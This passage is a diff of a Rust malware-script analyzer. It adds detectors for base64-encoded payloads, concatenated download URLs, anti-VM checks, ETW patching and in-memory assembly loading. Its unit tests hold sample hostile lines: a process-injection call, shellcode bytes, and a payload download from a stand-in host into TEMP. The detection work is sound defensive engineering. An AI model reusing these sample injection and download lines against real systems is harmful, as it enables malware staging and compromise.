@@ -110,14 +110,51 @@ static PROCESS_URL_ARG_RE: Lazy<Regex> = Lazy::new(|| {
 
 #[expect(clippy::expect_used, reason = "static regex construction")]
 static B64_INLINE_RE: Lazy<Regex> = Lazy::new(|| {
-    // Matches: FromBase64String('...') or FromBase64String("...").
+    // Matches: FromBase64String('...'), FromBase64String("..."), and
+    // PowerShell's no-parentheses method-call form: FromBase64String'...'.
     // Upper bound 8000 chars (~6 KB decoded) so we still catch the
     // Data.ps1 / Datanew.ps1 / yenisc2.ps1 / stub.ps1 family where the
     // whole script is one FromBase64String literal carrying the C2
     // URLs inside the decoded PS body. Keep a cap so a 5 MB blob
     // doesn't pin us in a doomed base64-decode loop.
-    Regex::new(r#"FromBase64String\s*\(\s*["']([A-Za-z0-9+/=]{20,8000})["']\s*\)"#)
+    Regex::new(r#"(?i)FromBase64String\s*(?:\(\s*)?["']([A-Za-z0-9+/=]{20,8000})["']\s*\)?"#)
         .expect("b64 inline regex")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_STRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*'{1,2}([^']*)'{1,2}"#)
+        .expect("ps string assign regex")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_REGEX_REPLACE_B64_CALL_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)FromBase64String\s*\(\s*\[regex\]::Replace\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*'{1,2}([^']*)'{1,2}\s*,\s*'{1,2}([^']*)'{1,2}\s*\)\s*\)"#,
+    )
+    .expect("ps regex replace b64 call regex")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*|'[^']*'|"[^"]*")\s*(?:\+\s*(?:\$[A-Za-z_][A-Za-z0-9_]*|'[^']*'|"[^"]*")){1,16})"#,
+    )
+    .expect("ps concat assign regex")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_CONCAT_EXPR_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)((?:\$[A-Za-z_][A-Za-z0-9_]*|'[^']*'|"[^"]*")\s*(?:\+\s*(?:\$[A-Za-z_][A-Za-z0-9_]*|'[^']*'|"[^"]*")){1,16})"#,
+    )
+    .expect("ps concat expr regex")
+});
+
+#[expect(clippy::expect_used, reason = "static regex construction")]
+static PS_CONCAT_PART_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)|'([^']*)'|"([^"]*)""#)
+        .expect("ps concat part regex")
 });
 
 /// Returns true for well-known noise URLs that appear in binary-embedded
@@ -250,6 +287,7 @@ const NOISE_EXACT_URLS: &[&str] = &[
     "https://github.com/ch2sh/batcloak",
     "https://github.com/baum1810",
     "https://massgrave.dev/troubleshoot",
+    "https://pyobfuscate.com",
     "https://www.cyotek.com",
     "http://www.skinstudio.netg",
     // XML / schema absolutes
@@ -395,6 +433,19 @@ fn is_known_or_known_query_prefix(known: &std::collections::HashSet<String>, url
                 || (url.eq_ignore_ascii_case("https://api.telegram.org/bot") && !suffix.is_empty())
         })
     })
+}
+
+fn is_known_or_known_scheme_variant(known: &std::collections::HashSet<String>, url: &str) -> bool {
+    if is_known_or_known_query_prefix(known, url) {
+        return true;
+    }
+    if let Some(rest) = url.strip_prefix("https://") {
+        return known.contains(&format!("http://{rest}"));
+    }
+    if let Some(rest) = url.strip_prefix("http://") {
+        return known.contains(&format!("https://{rest}"));
+    }
+    false
 }
 
 pub(crate) fn is_noise_url_context(line: &str, url: &str) -> bool {
@@ -2355,7 +2406,7 @@ fn first_url_literal(args: &str) -> Option<String> {
     for literal in quoted_string_literals(args) {
         let literal = trim_url_suffix(&literal);
         if looks_like_direct_url(literal) {
-            return Some(literal.to_string());
+            return normalize_liberal_url_token(literal).or_else(|| Some(literal.to_string()));
         }
     }
     None
@@ -2608,7 +2659,7 @@ fn emit_typo_webclient_download(
     env: &mut Environment,
     known: &mut std::collections::HashSet<String>,
 ) {
-    let url = url.to_string();
+    let url = url.trim().to_string();
     if is_noise_url(&url) || !known.insert(url.clone()) {
         return;
     }
@@ -3753,6 +3804,11 @@ fn scan_echoed_vbs_deob_text(deobfuscated: &str, env: &mut Environment) {
         return;
     }
 
+    let payload = vbs.into_bytes();
+    if has_vbs_downloader {
+        env.push_extracted_vbs(payload.clone());
+    }
+
     let mut payload_env = Environment::new(&crate::env::Config {
         max_depth: env.limits.max_depth,
         max_iterations: env.limits.max_iterations,
@@ -3764,7 +3820,8 @@ fn scan_echoed_vbs_deob_text(deobfuscated: &str, env: &mut Environment) {
         max_output_line_bytes: env.limits.max_output_line_bytes,
         max_traits_per_kind: 100,
     });
-    payload_env.all_extracted_vbs.push(vbs.into_bytes());
+    payload_env.limits.deadline = env.limits.deadline;
+    payload_env.all_extracted_vbs.push(payload);
     crate::vbs_scan::scan_vbs_payloads(&mut payload_env);
     merge_traits_with_download_dedupe(env, payload_env.traits);
 }
@@ -5097,7 +5154,8 @@ fn copied_curl_uses_config(tokens: &[String]) -> bool {
 }
 
 pub fn scan_copied_powershell_invocations(deobfuscated: &str, env: &mut Environment) {
-    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+    let mut ps_aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
+    let mut cmd_aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
     for t in &env.traits {
         let Trait::WindowsUtilManip { src, dst, .. } = t else {
             continue;
@@ -5105,17 +5163,25 @@ pub fn scan_copied_powershell_invocations(deobfuscated: &str, env: &mut Environm
         let Some(src_base) = basename_trimmed(src) else {
             continue;
         };
-        if !matches!(
+        let is_ps = matches!(
             src_base,
             s if s.eq_ignore_ascii_case("powershell.exe")
                 || s.eq_ignore_ascii_case("powershell")
                 || s.eq_ignore_ascii_case("pwsh.exe")
                 || s.eq_ignore_ascii_case("pwsh")
-        ) {
+        );
+        let is_cmd =
+            src_base.eq_ignore_ascii_case("cmd.exe") || src_base.eq_ignore_ascii_case("cmd");
+        if !is_ps && !is_cmd {
             continue;
         }
         let Some(dst_base) = basename_trimmed(dst) else {
             continue;
+        };
+        let aliases = if is_ps {
+            &mut ps_aliases
+        } else {
+            &mut cmd_aliases
         };
         aliases.insert(dst_base.to_string());
         if let Some(stem) = dst_base.strip_suffix(".exe") {
@@ -5148,12 +5214,12 @@ pub fn scan_copied_powershell_invocations(deobfuscated: &str, env: &mut Environm
         let Some(dst_base) = tokens.last().and_then(|dst| basename_trimmed(dst)) else {
             continue;
         };
-        aliases.insert(dst_base.to_string());
+        ps_aliases.insert(dst_base.to_string());
         if let Some(stem) = dst_base.strip_suffix(".exe") {
-            aliases.insert(stem.to_string());
+            ps_aliases.insert(stem.to_string());
         }
     }
-    if aliases.is_empty() {
+    if ps_aliases.is_empty() {
         return;
     }
 
@@ -5162,21 +5228,63 @@ pub fn scan_copied_powershell_invocations(deobfuscated: &str, env: &mut Environm
         let Some(cmd) = tokens.first() else {
             continue;
         };
-        if !copied_alias_matches_command_ci(&aliases, cmd) {
+        if copied_alias_matches_command_ci(&ps_aliases, cmd) {
+            push_manipulated_exec_once(env, line, cmd);
+            let Some(cmd_pos) = line.find(cmd) else {
+                continue;
+            };
+            let tail = line[cmd_pos + cmd.len()..].trim();
+            if tail.is_empty() {
+                continue;
+            }
+            let synthetic = format!("powershell {tail}");
+            crate::handlers::powershell::h_powershell(&synthetic, env);
             continue;
         }
-        push_manipulated_exec_once(env, line, cmd);
+        if !copied_alias_matches_command_ci(&cmd_aliases, cmd) {
+            continue;
+        }
         let Some(cmd_pos) = line.find(cmd) else {
             continue;
         };
         let tail = line[cmd_pos + cmd.len()..].trim();
-        if tail.is_empty() {
+        let Some(child) = copied_cmd_child_after_switch(tail) else {
+            continue;
+        };
+        let child_tokens = split_words(child);
+        let Some(child_cmd) = child_tokens.first() else {
+            continue;
+        };
+        if !copied_alias_matches_command_ci(&ps_aliases, child_cmd) {
             continue;
         }
-        let synthetic = format!("powershell {tail}");
+        push_manipulated_exec_once(env, line, cmd);
+        let Some(child_pos) = child.find(child_cmd) else {
+            continue;
+        };
+        let ps_tail = child[child_pos + child_cmd.len()..].trim();
+        if ps_tail.is_empty() {
+            continue;
+        }
+        let synthetic = format!("powershell {ps_tail}");
         crate::handlers::powershell::h_powershell(&synthetic, env);
     }
     dedup_exec_ps1(env);
+}
+
+fn copied_cmd_child_after_switch(rest: &str) -> Option<&str> {
+    let mut search_from = 0usize;
+    for token in split_words(rest) {
+        let rel = rest.get(search_from..)?.find(&token)?;
+        let start = search_from + rel;
+        let end = start + token.len();
+        let normalized = token.trim_matches(['"', '\'']).to_ascii_lowercase();
+        if matches!(normalized.as_str(), "/c" | "/k" | "-c" | "-k") {
+            return Some(rest[end..].trim_start());
+        }
+        search_from = end;
+    }
+    None
 }
 
 fn scan_copied_anti_recovery_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
@@ -7649,6 +7757,130 @@ fn scan_self_elevation(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+pub(crate) fn resolve_self_elevation_args_from_batch_assignments(raw: &str, env: &mut Environment) {
+    if !raw.contains('%')
+        || !env.traits.iter().any(
+            |t| matches!(t, Trait::SelfElevation { args: Some(args), .. } if args.contains('%')),
+        )
+    {
+        return;
+    }
+    let assignments = collect_simple_set_assignments(raw);
+    if assignments.is_empty() {
+        return;
+    }
+    let file_path = env
+        .file_path
+        .as_ref()
+        .map(|path| path.display().to_string());
+    for trait_item in &mut env.traits {
+        let Trait::SelfElevation {
+            args: Some(args), ..
+        } = trait_item
+        else {
+            continue;
+        };
+        if let Some(expanded) =
+            expand_batch_percent_refs_for_trait(args, &assignments, file_path.as_deref(), 0)
+        {
+            *args = expanded;
+        }
+    }
+}
+
+fn collect_simple_set_assignments(raw: &str) -> std::collections::HashMap<String, String> {
+    let mut assignments = std::collections::HashMap::new();
+    for line in raw.lines() {
+        let trimmed = line.trim();
+        let Some(rest) = strip_ascii_case_insensitive_prefix(trimmed, "set ") else {
+            continue;
+        };
+        let item = rest.trim();
+        let item = if item.starts_with('"') && item.ends_with('"') && item.len() >= 2 {
+            &item[1..item.len() - 1]
+        } else {
+            item
+        };
+        let Some((name, value)) = item.split_once('=') else {
+            continue;
+        };
+        let name = name.trim();
+        if is_simple_percent_var_name(name) {
+            assignments.insert(name.to_ascii_lowercase(), value.trim().to_string());
+        }
+    }
+    assignments
+}
+
+fn expand_batch_percent_refs_for_trait(
+    text: &str,
+    assignments: &std::collections::HashMap<String, String>,
+    file_path: Option<&str>,
+    depth: u8,
+) -> Option<String> {
+    if depth >= 4 {
+        return None;
+    }
+    let chars: Vec<char> = text.chars().collect();
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    let mut i = 0;
+    while i < chars.len() {
+        if chars[i] != '%' {
+            out.push(chars[i]);
+            i += 1;
+            continue;
+        }
+        if chars.get(i + 1) == Some(&'~') {
+            if chars.get(i + 2) == Some(&'f') && chars.get(i + 3) == Some(&'0') {
+                if let Some(path) = file_path {
+                    out.push_str(path);
+                    changed = true;
+                } else {
+                    out.push_str("%~f0");
+                }
+                i += 4;
+                continue;
+            }
+            out.push('%');
+            i += 1;
+            continue;
+        }
+        if chars.get(i + 1) == Some(&'%') {
+            out.push('%');
+            out.push('%');
+            i += 2;
+            continue;
+        }
+        let mut j = i + 1;
+        while j < chars.len() && chars[j] != '%' {
+            j += 1;
+        }
+        if j >= chars.len() {
+            out.push('%');
+            i += 1;
+            continue;
+        }
+        let name: String = chars[i + 1..j].iter().collect();
+        if is_simple_percent_var_name(&name) {
+            if let Some(value) = assignments.get(&name.to_ascii_lowercase()) {
+                out.push_str(value);
+                changed = true;
+                i = j + 1;
+                continue;
+            }
+        }
+        out.push('%');
+        out.push_str(&name);
+        out.push('%');
+        i = j + 1;
+    }
+    if !changed {
+        return None;
+    }
+    expand_batch_percent_refs_for_trait(&out, assignments, file_path, depth + 1).or(Some(out))
+}
+
 /// Detect Defender / AV evasion. Common forms:
 ///   `Add-MpPreference -ExclusionPath '<path>'`
 ///   `Add-MpPreference -ExclusionExtension '<.exe>'`
@@ -8131,8 +8363,8 @@ fn scan_defender_evasion(deobfuscated: &str, env: &mut Environment) {
     if let Some(m) = AMSI_BYPASS_RE.find(deobfuscated) {
         push("amsi-bypass", m.as_str().to_string());
     }
-    if ETW_PATCH_RE.is_match(deobfuscated) {
-        push("etw-patch", String::new());
+    if let Some(m) = ETW_PATCH_RE.find(deobfuscated) {
+        push("etw-patch", m.as_str().to_string());
     }
 }
 
@@ -8468,7 +8700,9 @@ fn scan_inmem_assembly_load(deobfuscated: &str, env: &mut Environment) {
         .expect("reflect load regex")
     });
     static APPDOMAIN_LOAD_RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r#"(?i)\[(?:system\.)?AppDomain\]::CurrentDomain\.Load\s*\("#)
+        Regex::new(
+            r#"(?i)(?:\[(?:system\.)?AppDomain\]::CurrentDomain|\[(?:system\.)?Threading\.Thread\]::GetDomain\s*\(\s*\))\.Load\s*\("#,
+        )
             .expect("appdomain load regex")
     });
     static DYNAMIC_REFLECT_LOAD_RE: Lazy<Regex> = Lazy::new(|| {
@@ -8719,6 +8953,78 @@ fn scan_lateral_movement(deobfuscated: &str, env: &mut Environment) {
         }
         if let Some(m) = c.get(1) {
             push("net-use", m.as_str().to_string());
+        }
+    }
+}
+
+fn scan_anti_analysis(deobfuscated: &str, env: &mut Environment) {
+    fn push(line: &str, target: &str, env: &mut Environment) {
+        let technique = "vm-sandbox-check".to_string();
+        let target = target.to_string();
+        if env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::AntiAnalysis {
+                    technique: existing_technique,
+                    target: existing_target,
+                    ..
+                } if existing_technique == &technique && existing_target == &target
+            )
+        }) {
+            return;
+        }
+        env.traits.push(Trait::AntiAnalysis {
+            technique,
+            target,
+            command: snippet_prefix(line.trim(), 240),
+        });
+    }
+
+    let lower = deobfuscated.to_ascii_lowercase();
+    if !(lower.contains("win32_computersystem")
+        || lower.contains("virtualbox")
+        || lower.contains("virtual machine")
+        || lower.contains("vmware")
+        || lower.contains("qemu")
+        || lower.contains("bochs")
+        || lower.contains("wds100t2b0a"))
+    {
+        return;
+    }
+
+    for line in deobfuscated.lines() {
+        if command_starts_with_echo(line) {
+            continue;
+        }
+        let lower_line = line.to_ascii_lowercase();
+        if lower_line.contains("win32_computersystem")
+            && (lower_line.contains("model") || lower_line.contains("manufacturer"))
+            && (lower_line.contains("virtual")
+                || lower_line.contains("vmware")
+                || lower_line.contains("qemu")
+                || lower_line.contains("bochs"))
+        {
+            push(line, "Win32_ComputerSystem:Virtual", env);
+        }
+        for (needle, target) in [
+            ("virtualbox", "VirtualBox"),
+            ("virtual machine", "Virtual Machine"),
+            ("vmware", "VMware"),
+            ("qemu harddisk", "QEMU HARDDISK"),
+            ("qemu", "QEMU"),
+            ("bochs", "BOCHS"),
+            ("wds100t2b0a", "WDS100T2B0A"),
+        ] {
+            if lower_line.contains(needle)
+                && (lower_line.contains(" if ")
+                    || lower_line.trim_start().starts_with("if ")
+                    || lower_line.contains("exit")
+                    || lower_line.contains("taskkill")
+                    || lower_line.contains("findstr")
+                    || lower_line.contains("win32_computersystem"))
+            {
+                push(line, target, env);
+            }
         }
     }
 }
@@ -9204,6 +9510,11 @@ fn scan_network_probe(deobfuscated: &str, env: &mut Environment) {
         if let Some((kind, target)) = powershell_wrapped_native_probe(line) {
             push(kind, target);
         }
+        for host in IP_DISCOVERY_HOSTS {
+            if contains_ascii_case_insensitive(line, host) {
+                push("ip-discovery", (*host).to_string());
+            }
+        }
         if let Some(target) = resolve_dns_name_target(line) {
             push("dns-lookup", target);
         }
@@ -9248,13 +9559,6 @@ fn scan_network_probe(deobfuscated: &str, env: &mut Environment) {
             if let Some(target) = network_probe_command_target(&tokens, "pathping") {
                 push("route-trace", target);
             }
-        }
-    }
-    for host in IP_DISCOVERY_HOSTS {
-        if deobfuscated.lines().any(|line| {
-            !command_starts_with_echo(line) && contains_ascii_case_insensitive(line, host)
-        }) {
-            push("ip-discovery", (*host).to_string());
         }
     }
 }
@@ -10025,6 +10329,9 @@ fn push_enumeration_once(
     command: String,
     command_specific: bool,
 ) {
+    if is_noisy_long_dynamic_function_enumeration(&command) {
+        return;
+    }
     if env.traits.iter().any(|t| {
         matches!(
             t,
@@ -10038,6 +10345,15 @@ fn push_enumeration_once(
         enum_kind: kind.to_string(),
         command,
     });
+}
+
+fn is_noisy_long_dynamic_function_enumeration(command: &str) -> bool {
+    if command.len() < 2048 {
+        return false;
+    }
+    let lower = command.to_ascii_lowercase();
+    (lower.contains("+='ion:'") || lower.contains("+=\"ion:\""))
+        && (lower.contains("(ni -p") || lower.contains("new-item"))
 }
 
 /// Credential access — lsass dumping, Mimikatz invocations, browser
@@ -10740,7 +11056,7 @@ fn command_basename_lower(token: &str) -> String {
 fn parse_zipfile_extract_to_directory(command: &str) -> Vec<(String, String, String)> {
     static ZIPFILE_EXTRACT_RE: Lazy<Regex> = Lazy::new(|| {
         Regex::new(
-            r#"(?i)(?:\[(?:System\.)?IO\.Compression\.ZipFile\]\s*::\s*)?ExtractToDirectory\s*\(\s*(?:"([^"\r\n]+)"|'([^'\r\n]+)')\s*,\s*(?:"([^"\r\n]+)"|'([^'\r\n]+)')"#,
+            r#"(?i)(?:\[(?:System\.)?IO\.Compression\.ZipFile\]\s*::\s*)?ExtractToDirectory\s*\(\s*(?:"([^"\r\n]+)"|'([^'\r\n]+)')\s*,\s*(?:"([^"\r\n]+)"|'([^'\r\n]+)')\s*\)?"#,
         )
         .expect("zipfile extract-to-directory regex")
     });
@@ -11370,23 +11686,50 @@ fn script_host_source_looks_script_like(src: &str) -> bool {
         .any(|ext| lower.ends_with(ext) || lower.contains(&format!("{ext}?")))
 }
 
+const DEOB_TEXT_DEEP_SCAN_MAX_BYTES: usize = 4 * 1024 * 1024;
+const DEOB_TEXT_DEADLINE_SHALLOW_SCAN_BYTES: usize = 256 * 1024;
+
 pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
+    if env.check_timeout() {
+        return;
+    }
+    if env.limits.deadline.is_some() && deobfuscated.len() > DEOB_TEXT_DEEP_SCAN_MAX_BYTES {
+        env.note_timeout();
+        return;
+    }
+    if env.limits.deadline.is_some() && deobfuscated.len() > DEOB_TEXT_DEADLINE_SHALLOW_SCAN_BYTES {
+        scan_deob_text_shallow(deobfuscated, env);
+        return;
+    }
     scan_self_elevation(deobfuscated, env);
+    if env.check_timeout() {
+        return;
+    }
     scan_defender_evasion(deobfuscated, env);
+    scan_anti_analysis(deobfuscated, env);
     scan_remote_access(deobfuscated, env);
     scan_inmem_assembly_load(deobfuscated, env);
     scan_lateral_movement(deobfuscated, env);
     scan_anti_recovery(deobfuscated, env);
+    if env.check_timeout() {
+        return;
+    }
     scan_evidence_cleanup(deobfuscated, env);
     scan_file_concealment(deobfuscated, env);
     scan_network_probe(deobfuscated, env);
     scan_enumeration(deobfuscated, env);
     scan_credential_access(deobfuscated, env);
+    if env.check_timeout() {
+        return;
+    }
     scan_process_injection(deobfuscated, env);
     scan_input_capture(deobfuscated, env);
     scan_ransom_ext(deobfuscated, env);
     scan_remote_exec(deobfuscated, env);
     scan_account_modification(deobfuscated, env);
+    if env.check_timeout() {
+        return;
+    }
     scan_uac_bypass(deobfuscated, env);
     scan_service_install(deobfuscated, env);
     scan_archive_extraction(deobfuscated, env);
@@ -11395,6 +11738,9 @@ pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
     scan_startup_folder_persistence(deobfuscated, env);
     scan_beacon_sleep(deobfuscated, env);
     scan_shellcode_marker(deobfuscated, env);
+    if env.check_timeout() {
+        return;
+    }
     scan_script_host_deob_text(deobfuscated, env);
     scan_bitsadmin_deob_text(deobfuscated, env);
     scan_python_requests_get_deob_text(deobfuscated, env);
@@ -11406,6 +11752,9 @@ pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
     scan_desktopimgdownldr_deob_text(deobfuscated, env);
     scan_process_url_arguments(deobfuscated, env);
     scan_url_variable_assignments(deobfuscated, env);
+    scan_powershell_concat_urls(deobfuscated, env);
+    scan_python_requests_get_deob_text(deobfuscated, env);
+    scan_inline_b64_urls(deobfuscated, env);
     scan_registry_url_values(deobfuscated, env);
     scan_echoed_vbs_deob_text(deobfuscated, env);
     scan_copied_bitsadmin_alias_deob_text(deobfuscated, env);
@@ -11463,7 +11812,346 @@ pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
     scan_resolved_deob_var_fragment_urls(deobfuscated, env);
     scan_embedded_powershell_downloads_in_deob_text(deobfuscated, env);
     scan_rot13_urls_in_deob_text(deobfuscated, env);
+    scan_plain_urls_in_deob_text(deobfuscated, env);
+}
 
+pub(crate) fn scan_deob_text_shallow(deobfuscated: &str, env: &mut Environment) {
+    scan_inmem_assembly_load(deobfuscated, env);
+    scan_url_launch_deob_text(deobfuscated, env);
+    scan_process_url_arguments(deobfuscated, env);
+    scan_url_variable_assignments(deobfuscated, env);
+    scan_powershell_concat_urls(deobfuscated, env);
+    scan_python_requests_get_deob_text(deobfuscated, env);
+    scan_inline_b64_urls(deobfuscated, env);
+    scan_registry_url_values(deobfuscated, env);
+    scan_damaged_scheme_download_urls(deobfuscated, env);
+    scan_ps_bare_url_downloads(deobfuscated, env);
+    scan_rot13_urls_in_deob_text(deobfuscated, env);
+    scan_plain_urls_in_deob_text(deobfuscated, env);
+}
+
+pub(crate) fn scan_extracted_script_text(deobfuscated: &str, env: &mut Environment) {
+    let compacted_script_scan;
+    let deobfuscated = if deobfuscated.len() >= 32 * 1024
+        && crate::util::contains_ascii_case_insensitive(deobfuscated, "frombase64string")
+    {
+        compacted_script_scan = compact_long_base64_literals_for_script_scan(deobfuscated);
+        compacted_script_scan.as_deref().unwrap_or(deobfuscated)
+    } else {
+        deobfuscated
+    };
+
+    if env.check_timeout() {
+        return;
+    }
+    scan_defender_evasion(deobfuscated, env);
+    scan_anti_analysis(deobfuscated, env);
+    scan_remote_access(deobfuscated, env);
+    scan_inmem_assembly_load(deobfuscated, env);
+    scan_lateral_movement(deobfuscated, env);
+    scan_anti_recovery(deobfuscated, env);
+    if env.check_timeout() {
+        return;
+    }
+    scan_evidence_cleanup(deobfuscated, env);
+    scan_file_concealment(deobfuscated, env);
+    scan_network_probe(deobfuscated, env);
+    scan_enumeration(deobfuscated, env);
+    scan_credential_access(deobfuscated, env);
+    if env.check_timeout() {
+        return;
+    }
+    scan_process_injection(deobfuscated, env);
+    scan_input_capture(deobfuscated, env);
+    scan_ransom_ext(deobfuscated, env);
+    scan_remote_exec(deobfuscated, env);
+    scan_account_modification(deobfuscated, env);
+    if env.check_timeout() {
+        return;
+    }
+    scan_uac_bypass(deobfuscated, env);
+    scan_service_install(deobfuscated, env);
+    scan_archive_extraction(deobfuscated, env);
+    scan_powershell_scheduled_task_persistence(deobfuscated, env);
+    scan_powershell_registry_persistence(deobfuscated, env);
+    scan_startup_folder_persistence(deobfuscated, env);
+    scan_beacon_sleep(deobfuscated, env);
+    scan_shellcode_marker(deobfuscated, env);
+    if env.check_timeout() {
+        return;
+    }
+    scan_script_host_deob_text(deobfuscated, env);
+    scan_bitsadmin_deob_text(deobfuscated, env);
+    scan_typo_webclient_downloads(deobfuscated, env);
+    scan_url_launch_deob_text(deobfuscated, env);
+    scan_process_url_arguments(deobfuscated, env);
+    scan_url_variable_assignments(deobfuscated, env);
+    scan_powershell_concat_urls(deobfuscated, env);
+    scan_inline_b64_urls(deobfuscated, env);
+    scan_registry_url_values(deobfuscated, env);
+    scan_curl_deob_text(deobfuscated, env);
+    scan_aria2_deob_text(deobfuscated, env);
+    scan_wget_deob_text(deobfuscated, env);
+    scan_certutil_urlcache_deob_text(deobfuscated, env);
+    scan_damaged_scheme_download_urls(deobfuscated, env);
+    scan_ps_bare_url_downloads(deobfuscated, env);
+    scan_ps_char_index_extractor_urls(deobfuscated, env);
+    scan_js_fromcharcode_urls(deobfuscated, env);
+    scan_js_unescape_urls(deobfuscated, env);
+    scan_js_atob_urls(deobfuscated, env);
+    scan_ps_var_socket_connect(deobfuscated, env);
+    scan_embedded_powershell_downloads_in_deob_text(deobfuscated, env);
+    scan_rot13_urls_in_deob_text(deobfuscated, env);
+    scan_plain_urls_in_deob_text(deobfuscated, env);
+}
+
+fn compact_long_base64_literals_for_script_scan(text: &str) -> Option<String> {
+    const MIN_LITERAL_BYTES: usize = 4096;
+    let mut changed = false;
+    let mut out = String::with_capacity(text.len().min(32 * 1024));
+
+    for line in text.split_inclusive('\n') {
+        let line_no_newline = line.trim_end_matches(['\r', '\n']);
+        let newline = &line[line_no_newline.len()..];
+        if line_no_newline.len() <= MIN_LITERAL_BYTES {
+            out.push_str(line);
+            continue;
+        }
+
+        if let Some(compacted) =
+            compact_long_base64_literal_line(line_no_newline, MIN_LITERAL_BYTES).or_else(|| {
+                compact_long_base64_continuation_line(line_no_newline, MIN_LITERAL_BYTES)
+            })
+        {
+            out.push_str(&compacted);
+            out.push_str(newline);
+            changed = true;
+        } else {
+            out.push_str(line);
+        }
+    }
+
+    changed.then_some(out)
+}
+
+fn compact_long_base64_literal_line(line: &str, min_literal_bytes: usize) -> Option<String> {
+    if !crate::util::contains_ascii_case_insensitive(line, "frombase64string") {
+        return None;
+    }
+    let marker_pos = find_ascii_case_insensitive(line, "frombase64string")?;
+    let after_marker = &line[marker_pos..];
+    let open_paren_rel = after_marker.find('(')?;
+    let after_paren = marker_pos + open_paren_rel + 1;
+    let quote_start = line[after_paren..]
+        .find(['"', '\''])
+        .map(|rel| after_paren + rel)?;
+    let quote = line.as_bytes()[quote_start];
+    let literal_start = quote_start + 1;
+    let literal_end = line[literal_start..]
+        .bytes()
+        .position(|b| b == quote)
+        .map(|rel| literal_start + rel)
+        .unwrap_or(line.len());
+    let literal = &line[literal_start..literal_end];
+    if literal.len() < min_literal_bytes || !literal.bytes().all(is_script_scan_base64_byte) {
+        return None;
+    }
+
+    let mut out = String::with_capacity(line.len() - literal.len() + 64);
+    out.push_str(&line[..literal_start]);
+    out.push_str("<batdeob omitted ");
+    out.push_str(&literal.len().to_string());
+    out.push_str(" base64 chars>");
+    out.push_str(&line[literal_end..]);
+    Some(out)
+}
+
+fn compact_long_base64_continuation_line(line: &str, min_literal_bytes: usize) -> Option<String> {
+    let prefix_len = line
+        .bytes()
+        .take_while(|byte| is_script_scan_base64_byte(*byte))
+        .count();
+    if prefix_len < min_literal_bytes {
+        return None;
+    }
+    let suffix = &line[prefix_len..];
+    if !suffix.trim().is_empty()
+        && !suffix
+            .trim()
+            .bytes()
+            .all(|byte| matches!(byte, b'"' | b'\'' | b')' | b';'))
+    {
+        return None;
+    }
+
+    let mut out = String::with_capacity(suffix.len() + 64);
+    out.push_str("<batdeob omitted ");
+    out.push_str(&prefix_len.to_string());
+    out.push_str(" base64 chars>");
+    out.push_str(suffix);
+    Some(out)
+}
+
+fn find_ascii_case_insensitive(haystack: &str, needle: &str) -> Option<usize> {
+    let haystack = haystack.as_bytes();
+    let needle = needle.as_bytes();
+    if needle.is_empty() || haystack.len() < needle.len() {
+        return None;
+    }
+    (0..=haystack.len() - needle.len())
+        .find(|&idx| haystack[idx..idx + needle.len()].eq_ignore_ascii_case(needle))
+}
+
+fn is_script_scan_base64_byte(byte: u8) -> bool {
+    byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'=')
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod extracted_script_scan_tests {
+    use super::scan_extracted_script_text;
+    use crate::env::Environment;
+    use crate::traits::Trait;
+    use crate::Config;
+    use base64::Engine;
+
+    #[test]
+    fn extracted_script_scan_keeps_high_signal_script_traits() {
+        let script = r#"
+Start-Sleep -Seconds 9
+[Kernel32]::WriteProcessMemory($proc, $addr, $payload, $payload.Length, [IntPtr]::Zero)
+[Byte[]] $sc = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00
+Invoke-WebRequest -Uri https://stage.example/payload.bin -OutFile $env:TEMP\p.bin
+"#;
+        let mut env = Environment::new(&Config::default());
+
+        scan_extracted_script_text(script, &mut env);
+
+        assert!(env
+            .traits
+            .iter()
+            .any(|t| matches!(t, Trait::BeaconSleep { seconds } if *seconds == 9)));
+        assert!(env
+            .traits
+            .iter()
+            .any(|t| matches!(t, Trait::ProcessInjection { api } if api == "WriteProcessMemory")));
+        assert!(env.traits.iter().any(
+            |t| matches!(t, Trait::ShellcodeMarker { evidence } if evidence == "msf-x64-prologue")
+        ));
+        assert!(env.traits.iter().any(
+            |t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://stage.example/payload.bin")
+                || matches!(t, Trait::Download { src, .. } if src == "https://stage.example/payload.bin")
+        ));
+    }
+
+    #[test]
+    fn extracted_script_scan_resolves_powershell_concat_urls() {
+        let script = r#"
+$Bytes = 'htt';
+$Bytes2 = 'ps://';
+$lfsdfsdg = $Bytes + $Bytes2;
+$links = @(($lfsdfsdg + 'bitbucket.example/downloads/test.jpg'),($lfsdfsdg + 'office.example/test.jpg'));
+"#;
+        let mut env = Environment::new(&Config::default());
+
+        scan_extracted_script_text(script, &mut env);
+
+        for expected in [
